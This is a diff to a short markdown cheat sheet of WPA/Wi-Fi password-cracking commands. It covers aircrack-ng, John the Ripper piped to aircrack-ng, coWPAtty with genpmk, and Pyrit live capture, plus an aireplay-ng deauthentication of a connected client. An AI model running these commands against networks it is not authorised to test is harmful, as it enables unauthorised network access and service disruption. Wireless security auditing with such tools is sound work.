@@ -1,8 +1,26 @@
-# Basic crackink methods
+## Basic crackink methods ##
 
   aircrack-ng <file_name>
   or
   aircrack-ng <file_name> -w \usr\share\john\password.lst
   
+   
+   
+## Cracking with JTR and Aircrack-ng ##
+
+   ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w - <capture_file>     ## cracking WPA password with JTR and aircrack-ng 
   
+  
+## Cracking with coWPAtty ##
+
+   genpmk -f <wordlist> -d <hashes_file> -s <ESSID>                              
+   cowpatty -r <capture> -d <hashes_file> -2 -s <ESSID>                            
+ 
+  
+## Cracking with Pyrit ##
+
+
+   pyrit -r <interface> -o <capture_file> stripLive                          
+   aireplay-ng -0 1 -a <AP_MAC> -c <connected_client_mac> <interface>                  
+   pyrit -r <capture_file> -i <wordlist> -b <AP_MAC> attack_passthrough      
   
